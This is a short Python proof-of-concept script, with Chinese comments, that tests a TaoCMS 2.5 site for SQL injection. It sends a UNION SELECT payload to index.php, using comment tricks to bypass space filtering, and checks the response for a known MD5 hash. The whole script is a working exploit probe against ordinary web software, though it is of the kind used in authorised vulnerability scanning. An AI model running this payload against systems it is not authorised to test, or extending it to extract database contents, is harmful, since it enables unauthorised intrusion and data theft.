import requests


def poc(url):
    """
    TaoCMS 2.5 SQL Injection POC
    :param url: 目标 URL
    :return: 如果发现漏洞，返回 True；否则返回 False
    """
    payload = ("/index.php/*123*/'union/**/select/**/1,2,3,4,5,6,7,8,md5(3.1415),10,11%23&action=getatlbyid")
    target_url = url + payload
    print(f"Testing URL: {target_url}")

    try:
        # 发送请求
        response = requests.get(target_url)

        # 检查返回的状态码以及返回体
        if response.status_code == 200 and '63e1f04640e83605c1d177544a5a0488' in response.text:
            print(f"Vulnerability found at: {target_url}")
            return True
        else:
            return False
    except requests.exceptions.RequestException as e:
        print(f"Error testing {url}: {e}")
        return False
